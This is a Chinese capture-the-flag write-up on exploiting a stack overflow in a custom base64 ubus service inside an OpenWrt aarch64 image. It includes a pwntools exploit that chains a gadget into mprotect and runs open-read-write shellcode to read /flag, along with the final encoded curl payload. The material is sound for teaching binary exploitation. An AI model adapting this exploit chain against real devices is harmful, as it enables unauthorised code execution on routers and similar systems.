基本分析
====

确认大致漏洞点
-------

题目给出了一个openwrt的img，从官网中下载官方的文件系统

<https://downloads.openwrt.org/releases/22.03.3/targets/armvirt/64/>

diff后发现，在rdp中多了一个base64的服务，d3op的文件系统比官网多了一个base64的elf，位于usr/libexec/rpcd，那么本题的漏洞点可以大致确定在base64这个elf中。

[![p9BDsTU.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-cde1dbb81e59c534ad47b16f3a2c3686e5868dc5.png)](https://imgse.com/i/p9BDsTU)

这个base64并不是直接去调用，而是在qemu中使用ubus去call这个应用程序间接调用。

交互
--

### 本地调试

payload例子：

```Shell
curl -S ubus call base64 encode '{"input":"payload"}'
```

### 远程

payload例子：

```Shell
curl -v -d '{"jsonrpc":"2.0", "method":"call", "id":1, "params":["00000000000000000000000000000000","base64","decode",{"input":"payload"}]  }' http://localhost:9999/ubus
```

逆向分析
----

base64为aarch64架构，仅仅开启了nx保护，静态编译

由于我们知道base64提供了encode和decode的功能，所以可以搜索字符串快速定位到main\_fun函数。

sub\_40655c内容，主要在judge op后会判断走encode还是decode

[![p9BD6kF.md.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-fd8e15208acf29fca5c9c86ffa60c7fb9380f4b0.png)](https://imgse.com/i/p9BD6kF)

在decode函数中，通过两个if判断来判断size是否可以继续解码写入数据到内存，其中存在v16数组越界，可以覆盖到下面的变量，从而造成溢出

[![p9BDcY4.md.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-03e87fd26009a18752668453cdb63b8cefaf9f34.png)](https://imgse.com/i/p9BDcY4)

利用思路
====

如何劫持执行流
-------

由于可以栈溢出，并且在decode函数的最后汇编如下

[![p9BDRp9.md.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-52b3495eea0470339a3c2061e26a31bc607949e7.png)](https://imgse.com/i/p9BDRp9)

汇编意义：

LDR是将memory中的数载入到寄存器，LDR可以载入立即数。格式如下：**LDR 目的寄存器，源**

STR是将寄存器中的数字载入内存。格式如下：**STR{条件} 源寄存器，&lt;存储器地址&gt;**

可以看到最后是通过sp来对x29，x30寄存器进行赋值，最后ret。

那么意味着我们栈溢出可以hijack掉这两个寄存器，并且由于aarch64架构下，函数返回地址是存放在x30，因此我们可以劫持执行流。

寻找可用的函数
-------

由于是静态编译，不难想到可以查找下该elf编译了什么库函数。

通过搜索系统调用号，我们可以找到mprotect函数的位置

[![p9BDWlR.md.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-b9bc7704cb056d100a1a5cdaeb7ac410f905aa5d.png)](https://imgse.com/i/p9BDWlR)

交叉引用下，发现只有两处调用mprotect函数时的第三个参数是7。

最后锁定了这一处，因为这可以控制通过x0+padding的方式控制完所有需要的寄存器。

[![p9BDoTO.md.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a939199abaa2e43e5dbd8b83b106b940013af388.png)](https://imgse.com/i/p9BDoTO)

因此我们尝试寻找一个能控制x0的gadget，这样我们就能在一定偏移处布置到调用mprotect时的寄存器，于此同时，这个gadget也需要能够再做一次执行流的跳转，此外mprotect记得地址要000结尾（逃

最后锁定下图的第四条gadget

[![p9BDHte.md.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-b7d044cfcdde58e5a5a0b8a92ea6928bdddcca10.png)](https://imgse.com/i/p9BDHte)

至此我们就可以愉快的使用shellcode，但真的就结束了吗（

如何愉快的带出flag
-----------

在最后成功执行完orw后，我俩望着没有任何回显的shell发呆。

是的，在这题里就算你能hijack掉执行流，也不会有flag回显，甚至任何输出都没有。

因为是通过ubus call去调用的base64，然后我们hijack的是base64的执行流，base64打印flag与我ubus有何相关（bushi

通过询问chatgpt

[![p9BDLpd.md.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-4bc8817b64dc1980573ff31565ebd77db186fb28.png)](https://imgse.com/i/p9BDLpd)

我们可以大致捋清楚该过程，即客户端（即我们）是通过发送请求来让另一个进程响应请求并且调用base64，所以最后base64进程结束后，ubus会解析判断这个进程的返回值，即output，我们hijack了base64后直接write flag，由于不符合ubus 的 json返回格式，所以不会被解析然后传到ubus返回到当前shell

在最后，鼠鼠我尝试让执行流执行完read操作后，再跳回到原本的output，企图带出flag（但很显然失败的，失败的原因鼠鼠猜测是走到这里没办法正常的exit掉这个进程，然后客户端没有接收到这个进程exit的信号

最后的最后，我们采用了自行伪造一个json，输出flag的时候带上{"output":""}

意思呢就是payload里本来就带有这么一个输出格式，执行shellcode的时候把flag写到这个格式里面，然后write这个一段，exit掉进程，ubus就会接收到这个进程exit，然后解析判断output，由于我们的output伪造成了一个正确的返回格式，于是就会将我们的flag愉快的带出来

Exp
===

```Python
from pwn import *
import base64
context.arch = "aarch64"

mprotect = 0x4579a0
shellcode = shellcraft.open("/flag",0)
shellcode += shellcraft.read(3,0x4a22bc,0x100)
shellcode += shellcraft.write(1,0x00000000004A22B0,0x100)
shellcode += shellcraft.exit(1)

#mprotect(0x00000000004A2098,0x400,7)

'''
.text:00000000004579A0 FD 7B BF A9                   STP             X29, X30, [SP,#-0x10+var_s0]!
.text:00000000004579A4 E2 00 80 52                   MOV             W2, #7
.text:00000000004579A8 FD 03 00 91                   MOV             X29, SP
.text:00000000004579AC 03 48 42 F9                   LDR             X3, [X0,#0x490]
.text:00000000004579B0 01 4C 42 F9                   LDR             X1, [X0,#0x498]
.text:00000000004579B4 00 50 42 F9                   LDR             X0, [X0,#0x4A0]
.text:00000000004579B8 21 00 00 CB                   SUB             X1, X1, X0
.text:00000000004579BC 60 00 00 8B                   ADD             X0, X3, X0
.text:00000000004579C0 60 2E FF 97                   BL              mprotect
'''

x0_x29_x30 = 0x4494b8
mprotect = 0x4579a4
payload = asm(shellcode)
payload = payload.ljust(0x200,b"\x00")
payload += p64(0)+p64(0x4a3000)+p64(0x4a2000) #0x18
payload += b"{\"output\": \"" #0x4a22b0:    "{\"output\": \""
payload += b'A'*0x50
payload += b"\"}"
payload = payload.ljust(0x418, b"\x00")
payload += b"\x30\x06\x00\x00" + b"\x1d\x04\x00\x00" + b"\x84\x05\x00\x00" + b"\x90\x04\x00\x00"
payload += p64(0x4a2098) #x29
payload += p64(x0_x29_x30) #x30
payload += p64(0)*4 + p64(0x4A2098) + p64(mprotect)   #29 #30
payload += p64(0x4A2298 - 0x490) #x0 0x470
payload += p64(0x4a2098)*3
payload = base64.b64encode(payload)
print(len(shellcode))
print(payload)
```

最后打远程的payload：

```Python
curl -v -d '{"jsonrpc":"2.0", "method":"call", "id":1, "params":["00000000000000000000000000000000","base64","decode",{"input":"7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oFXhNJBCaDyAiCA0ugHgNIBAADUIACA0gFWhNJBCaDyAiCA0ggIgNIBAADUIACA0qgLgNIBAADUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwSgAAAAAAACBKAAAAAAB7Im91dHB1dCI6ICJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSJ9AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAGAAAdBAAAhAUAAJAEAACYIEoAAAAAALiURAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACYIEoAAAAAAKR5RQAAAAAACB5KAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAAA="}]  }' http://localhost:9999/ubus
```

结果如下

[![p9BDX6I.md.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-6f4640ab389296ca5505bf8e999f27d210db3c32.png)](https://imgse.com/i/p9BDX6I)